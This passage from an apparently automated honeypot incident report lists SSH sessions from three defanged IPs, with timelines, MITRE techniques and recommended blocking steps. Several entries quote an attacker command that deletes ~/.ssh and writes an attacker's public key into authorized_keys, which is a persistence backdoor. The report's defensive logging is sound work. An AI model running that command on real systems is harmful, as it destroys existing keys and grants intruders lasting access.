| `2026-04-07 05:24:40` | `cowrie.command.failed` |
| `2026-04-07 05:24:40` | `cowrie.log.closed` |
| `2026-04-07 05:24:40` | `cowrie.session.params` |
| `2026-04-07 05:24:40` | `cowrie.command.input` |
| `2026-04-07 05:24:40` | `cowrie.session.file_download` |
| `2026-04-07 05:24:40` | `cowrie.log.closed` |
| `2026-04-07 05:24:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79287b064230

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:24 |
| **Last Seen** | 2026-04-07 05:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:24:42` | `cowrie.session.connect` |
| `2026-04-07 05:24:42` | `cowrie.client.version` |
| `2026-04-07 05:24:42` | `cowrie.client.kex` |
| `2026-04-07 05:24:42` | `cowrie.login.success` |
| `2026-04-07 05:24:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea6baafbc1d3

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-04-07 05:25 |
| **Last Seen** | 2026-04-07 05:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:25:49` | `cowrie.session.connect` |
| `2026-04-07 05:25:49` | `cowrie.client.version` |
| `2026-04-07 05:25:49` | `cowrie.client.kex` |
| `2026-04-07 05:25:50` | `cowrie.login.success` |
| `2026-04-07 05:25:50` | `cowrie.session.params` |
| `2026-04-07 05:25:50` | `cowrie.command.input` |
| `2026-04-07 05:25:50` | `cowrie.command.failed` |
| `2026-04-07 05:25:50` | `cowrie.log.closed` |
| `2026-04-07 05:25:51` | `cowrie.session.params` |
| `2026-04-07 05:25:51` | `cowrie.command.input` |
| `2026-04-07 05:25:51` | `cowrie.session.file_download` |
| `2026-04-07 05:25:51` | `cowrie.log.closed` |
| `2026-04-07 05:25:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-764f9556620b

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-04-07 05:25 |
| **Last Seen** | 2026-04-07 05:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:25:53` | `cowrie.session.connect` |
| `2026-04-07 05:25:53` | `cowrie.client.version` |
| `2026-04-07 05:25:53` | `cowrie.client.kex` |
| `2026-04-07 05:25:54` | `cowrie.login.success` |
| `2026-04-07 05:25:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74ed21f4f56f

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:26 |
| **Last Seen** | 2026-04-07 05:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:26:34` | `cowrie.session.connect` |
| `2026-04-07 05:26:34` | `cowrie.client.version` |
| `2026-04-07 05:26:34` | `cowrie.client.kex` |
| `2026-04-07 05:26:35` | `cowrie.login.success` |
| `2026-04-07 05:26:36` | `cowrie.session.params` |
| `2026-04-07 05:26:36` | `cowrie.command.input` |
| `2026-04-07 05:26:36` | `cowrie.command.failed` |
| `2026-04-07 05:26:36` | `cowrie.log.closed` |
| `2026-04-07 05:26:36` | `cowrie.session.params` |
| `2026-04-07 05:26:36` | `cowrie.command.input` |
| `2026-04-07 05:26:37` | `cowrie.session.file_download` |
| `2026-04-07 05:26:37` | `cowrie.log.closed` |
| `2026-04-07 05:26:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59331b1cbc97

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:26 |
| **Last Seen** | 2026-04-07 05:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:26:39` | `cowrie.session.connect` |
| `2026-04-07 05:26:39` | `cowrie.client.version` |
| `2026-04-07 05:26:40` | `cowrie.client.kex` |
| `2026-04-07 05:26:41` | `cowrie.login.success` |
| `2026-04-07 05:26:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc42bc8125b3

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-04-07 05:27 |
| **Last Seen** | 2026-04-07 05:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:27:21` | `cowrie.session.connect` |
| `2026-04-07 05:27:21` | `cowrie.client.version` |
| `2026-04-07 05:27:21` | `cowrie.client.kex` |
| `2026-04-07 05:27:22` | `cowrie.login.success` |
| `2026-04-07 05:27:22` | `cowrie.session.params` |
| `2026-04-07 05:27:22` | `cowrie.command.input` |
| `2026-04-07 05:27:22` | `cowrie.command.failed` |
| `2026-04-07 05:27:22` | `cowrie.log.closed` |
| `2026-04-07 05:27:23` | `cowrie.session.params` |
| `2026-04-07 05:27:23` | `cowrie.command.input` |
| `2026-04-07 05:27:23` | `cowrie.session.file_download` |
| `2026-04-07 05:27:23` | `cowrie.log.closed` |
| `2026-04-07 05:27:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be7d5e3a4893

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-04-07 05:27 |
| **Last Seen** | 2026-04-07 05:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:27:25` | `cowrie.session.connect` |
| `2026-04-07 05:27:25` | `cowrie.client.version` |
| `2026-04-07 05:27:25` | `cowrie.client.kex` |
| `2026-04-07 05:27:26` | `cowrie.login.success` |
| `2026-04-07 05:27:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-501c89927a83

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:28 |
| **Last Seen** | 2026-04-07 05:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:28:05` | `cowrie.session.connect` |
| `2026-04-07 05:28:05` | `cowrie.client.version` |
| `2026-04-07 05:28:05` | `cowrie.client.kex` |
| `2026-04-07 05:28:06` | `cowrie.login.success` |
| `2026-04-07 05:28:07` | `cowrie.session.params` |
| `2026-04-07 05:28:07` | `cowrie.command.input` |
| `2026-04-07 05:28:07` | `cowrie.command.failed` |
| `2026-04-07 05:28:07` | `cowrie.log.closed` |
| `2026-04-07 05:28:07` | `cowrie.session.params` |
| `2026-04-07 05:28:07` | `cowrie.command.input` |
| `2026-04-07 05:28:08` | `cowrie.session.file_download` |
| `2026-04-07 05:28:08` | `cowrie.log.closed` |
| `2026-04-07 05:28:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e53905ab7f48

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:28 |
| **Last Seen** | 2026-04-07 05:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:28:10` | `cowrie.session.connect` |
| `2026-04-07 05:28:10` | `cowrie.client.version` |
| `2026-04-07 05:28:10` | `cowrie.client.kex` |
| `2026-04-07 05:28:11` | `cowrie.login.success` |
| `2026-04-07 05:28:11` | `cowrie.session.params` |
| `2026-04-07 05:28:11` | `cowrie.command.input` |
| `2026-04-07 05:28:11` | `cowrie.command.failed` |
| `2026-04-07 05:28:11` | `cowrie.log.closed` |
| `2026-04-07 05:28:11` | `cowrie.session.params` |
| `2026-04-07 05:28:11` | `cowrie.command.input` |
| `2026-04-07 05:28:11` | `cowrie.session.file_download` |
| `2026-04-07 05:28:11` | `cowrie.log.closed` |
| `2026-04-07 05:28:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d9eab025ebe

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:28 |
| **Last Seen** | 2026-04-07 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:28:10` | `cowrie.session.connect` |
| `2026-04-07 05:28:10` | `cowrie.client.version` |
| `2026-04-07 05:28:11` | `cowrie.client.kex` |
| `2026-04-07 05:28:11` | `cowrie.login.success` |
| `2026-04-07 05:28:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a02b3e4156a

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:28 |
| **Last Seen** | 2026-04-07 05:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:28:13` | `cowrie.session.connect` |
| `2026-04-07 05:28:13` | `cowrie.client.version` |
| `2026-04-07 05:28:13` | `cowrie.client.kex` |
| `2026-04-07 05:28:14` | `cowrie.login.success` |
| `2026-04-07 05:28:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cda45ea24150

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-04-07 05:28 |
| **Last Seen** | 2026-04-07 05:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:28:54` | `cowrie.session.connect` |
| `2026-04-07 05:28:54` | `cowrie.client.version` |
| `2026-04-07 05:28:54` | `cowrie.client.kex` |
| `2026-04-07 05:28:55` | `cowrie.login.success` |
| `2026-04-07 05:28:55` | `cowrie.session.params` |
| `2026-04-07 05:28:55` | `cowrie.command.input` |
| `2026-04-07 05:28:55` | `cowrie.command.failed` |
| `2026-04-07 05:28:55` | `cowrie.log.closed` |
| `2026-04-07 05:28:56` | `cowrie.session.params` |
| `2026-04-07 05:28:56` | `cowrie.command.input` |
| `2026-04-07 05:28:56` | `cowrie.session.file_download` |
| `2026-04-07 05:28:56` | `cowrie.log.closed` |
| `2026-04-07 05:28:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eeb3e0e34859

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-04-07 05:28 |
| **Last Seen** | 2026-04-07 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:28:58` | `cowrie.session.connect` |
| `2026-04-07 05:28:58` | `cowrie.client.version` |
| `2026-04-07 05:28:58` | `cowrie.client.kex` |
| `2026-04-07 05:28:59` | `cowrie.login.success` |
| `2026-04-07 05:28:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a327ddeea1ad

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:29 |
| **Last Seen** | 2026-04-07 05:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:29:39` | `cowrie.session.connect` |
| `2026-04-07 05:29:39` | `cowrie.client.version` |
| `2026-04-07 05:29:39` | `cowrie.client.kex` |
| `2026-04-07 05:29:40` | `cowrie.login.success` |
| `2026-04-07 05:29:40` | `cowrie.session.params` |
| `2026-04-07 05:29:40` | `cowrie.command.input` |
| `2026-04-07 05:29:40` | `cowrie.command.failed` |
| `2026-04-07 05:29:41` | `cowrie.log.closed` |
| `2026-04-07 05:29:41` | `cowrie.session.params` |
| `2026-04-07 05:29:41` | `cowrie.command.input` |
| `2026-04-07 05:29:41` | `cowrie.session.file_download` |
| `2026-04-07 05:29:41` | `cowrie.log.closed` |
| `2026-04-07 05:29:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84e9c342f1b3

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:29 |
| **Last Seen** | 2026-04-07 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:29:44` | `cowrie.session.connect` |
| `2026-04-07 05:29:44` | `cowrie.client.version` |
| `2026-04-07 05:29:44` | `cowrie.client.kex` |
| `2026-04-07 05:29:45` | `cowrie.login.success` |
| `2026-04-07 05:29:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa7369ed4dfc

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-04-07 05:30 |
| **Last Seen** | 2026-04-07 05:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:30:24` | `cowrie.session.connect` |
| `2026-04-07 05:30:24` | `cowrie.client.version` |
| `2026-04-07 05:30:24` | `cowrie.client.kex` |
| `2026-04-07 05:30:25` | `cowrie.login.success` |
| `2026-04-07 05:30:25` | `cowrie.session.params` |
| `2026-04-07 05:30:25` | `cowrie.command.input` |
| `2026-04-07 05:30:25` | `cowrie.command.failed` |
| `2026-04-07 05:30:25` | `cowrie.log.closed` |
| `2026-04-07 05:30:25` | `cowrie.session.params` |
| `2026-04-07 05:30:25` | `cowrie.command.input` |
| `2026-04-07 05:30:26` | `cowrie.session.file_download` |
| `2026-04-07 05:30:26` | `cowrie.log.closed` |
| `2026-04-07 05:30:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42ca3ab49db7

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-04-07 05:30 |
| **Last Seen** | 2026-04-07 05:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:30:28` | `cowrie.session.connect` |
| `2026-04-07 05:30:28` | `cowrie.client.version` |
| `2026-04-07 05:30:28` | `cowrie.client.kex` |
| `2026-04-07 05:30:29` | `cowrie.login.success` |
| `2026-04-07 05:30:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04160a464ee8

